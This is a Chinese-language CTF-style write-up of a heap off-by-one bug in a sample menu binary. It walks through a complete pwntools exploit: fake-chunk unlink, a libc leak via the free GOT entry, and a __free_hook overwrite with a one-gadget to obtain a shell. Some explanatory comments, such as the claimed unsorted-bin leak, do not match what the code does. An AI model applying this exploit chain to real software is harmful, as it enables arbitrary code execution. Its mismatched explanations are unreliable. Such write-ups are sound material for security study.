# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，执行环境总结如下：
- **二进制类型**：64位ELF可执行文件，动态链接（使用`file`命令确认：ELF 64-bit LSB executable, x86-64）
- **防护机制**（通过`checksec`分析）：
  - Full RELRO：GOT表只读，无法直接修改
  - Stack Canary：栈保护启用
  - NX：堆栈不可执行
  - No PIE：代码段地址固定，便于利用
- **依赖库**（通过`ldd`确认）：
  - libc.so.6：动态链接的C库（具体版本从泄漏地址推断）
  - ld-linux-x86-64.so.2：动态链接器
- **运行需求**：Linux环境，需要标准输入输出交互，使用pwntools框架进行漏洞利用开发

## 漏洞成因
### 关键结构体分析
程序使用全局数组管理堆块，无显式结构体定义：
- `heap`数组（地址0x6020e0）：存储分配的内存块指针（`_QWORD*`类型），索引范围0-0x20（32个槽位）
- `len`数组（地址0x602060）：存储对应内存块的大小（整数）
- `key1`（地址0x6020c0）：限制`edit`操作次数（初始为0，达到2时退出程序）
- `key2`（地址0x6020c4）：控制`show`操作权限（非零时允许显示）

### 漏洞详细分析
漏洞位于`ed`函数（编辑功能）的以下代码：
```c
v2[read(0, v2, (int)len[v1])] = 0;
```
- **漏洞类型**：堆缓冲区off-by-one溢出
- **触发条件**：当用户输入的数据长度恰好等于内存块大小（`len[v1]`）时
- **漏洞机制**：
  - `read`函数返回实际读取的字节数，该值被直接用作索引写入null字节
  - 如果读取字节数等于块大小，写入操作发生在`v2[len[v1]]`，超出分配边界（有效索引为0到len[v1]-1）
  - 导致覆盖相邻堆块的元数据（如size字段），清除PREV_INUSE位
- **利用影响**：通过精心构造堆布局，可操纵堆合并过程，实现任意地址读写和代码执行

### 内存变化关键点总结
- **堆元数据操纵**：通过off-by-one修改Chunk2的size字段（0x101→0x100），清除PREV_INUSE位，为堆合并创造条件
- **libc地址泄漏**：释放Chunk1进入unsorted bin，通过fd/bk指针泄漏main_arena地址，计算libc基地址
- **任意地址写**：利用堆布局操纵，使heap[32]指向__free_hook，进而覆盖为one-gadget地址
- **执行流劫持**：触发free操作时执行__free_hook中的one-gadget，获得shell权限

## Exploit
以下是带详细注释的漏洞利用脚本：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample1')
p = process('./data/sample1')
libc = elf.libc  # 获取程序使用的libc

# 定义常用函数简化代码
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

# 功能封装函数
def edit(index, Content):
    ru("show")
    sl('3')
    ru("index:")
    sl(str(index))
    ru("content:")
    sd(Content)

def free(Index):
    ru("show")
    sl('2')
    ru("index:")
    sl(str(Index))

def malloc(index, size, content):
    ru("show")
    sl('1')
    ru("index:")
    sl(str(index))
    ru("size:")
    sl(str(size))
    ru("content:")
    sd(content)

def puts(index):
    ru("show")
    sl('4')
    ru("index:")
    sl(str(index))

# Step 1: 创建特定堆布局，分配四个chunk
# 目的：为off-by-one漏洞利用准备堆环境，索引32指向第二个chunk是关键
malloc(0, 0xf8, 'aaaa')
malloc(32, 0xf8, 'bbbb')  # 关键：索引32指向第二个chunk
malloc(1, 0xf8, 'cccc')
malloc(31, 0xf8, 'dddd')

# Step 2: 构造伪造chunk并触发off-by-one漏洞
# 目的：在Chunk1中伪造chunk结构，修改Chunk2的size字段
free_got = elf.got['free']  # 获取free函数的GOT地址
ptr = 0x6021E0  # 全局数组中的特定位置
FD = ptr - 24   # 伪造chunk的fd指针
BK = ptr - 16   # 伪造chunk的bk指针
# 构造伪造chunk：prev_size=0, size=0xf1, fd=FD, bk=BK
py = p64(0) + p64(0xf1) + p64(FD) + p64(BK)
py = py.ljust(0xf0, b"\x00")  # 填充到0xf0字节
py += p64(0xf0)  # 设置prev_size，为堆合并准备
edit(32, py)  # 触发off-by-one，修改Chunk2的size

# Step 3: 释放chunk触发unsorted bin，泄漏libc地址
free(1)  # 释放Chunk1，进入unsorted bin，fd/bk指向main_arena

# Step 4: 编辑chunk设置指针，准备任意地址写
# 目的：使heap[32]指向__free_hook，为后续覆盖做准备
py = p64(0x6021E0) * 3 + p64(free_got) + b'a' * 0xD0 + p64(1)
edit(32, py)

# Step 5: 使用show功能读取内存，获取free函数地址
puts(32)  # 读取heap[32]指向的内容，包含libc地址

# Step 6: 计算libc基地址和one-gadget地址
free_addr = u64(ru(b"\n1.")[1:7].ljust(8, b'\x00'))  # 解析free函数地址
# 计算one-gadget地址（libc中执行system("/bin/sh")的gadget）
onegadget = free_addr - libc.symbols["free"] + 0x4527a
# 计算__free_hook地址
free_hook = free_addr - libc.symbols["free"] + libc.symbols['__free_hook']

# Step 7: 编辑chunk覆盖__free_hook地址
# 目的：将__free_hook地址写入可控位置
pay = p64(free_hook)
pay = pay.ljust(0xf0, b'\x00')  # 填充
pay += p64(1)  # 设置标志位
edit(31, pay)

# Step 8: 覆盖__free_hook为one-gadget地址
edit(32, p64(onegadget))  # 关键：将one-gadget地址写入__free_hook

# Step 9: 触发__free_hook执行，获得shell
free(0)  # 释放操作触发__free_hook，执行one-gadget

# Step 10: 进入交互模式，使用获得的shell
p.interactive()
```

### 关键注释说明
- **堆布局设计**：步骤1中特意使用索引32指向第二个chunk，是为了利用程序的索引处理逻辑，便于后续操纵
- **off-by-one利用**：步骤2通过精确的字节填充触发off-by-one，修改相邻chunk的size字段
- **libc泄漏**：步骤3-5通过unsorted bin机制泄漏libc地址，绕过ASLR
- **任意地址写**：步骤7-8通过操纵全局数组指针，实现__free_hook的覆盖
- **执行流劫持**：步骤9通过free操作触发植入的one-gadget，实现权限提升

该exp成功利用了off-by-one漏洞，通过堆布局操纵和libc地址泄漏，最终覆盖__free_hook获得shell权限，展示了完整的内存破坏型漏洞利用链。
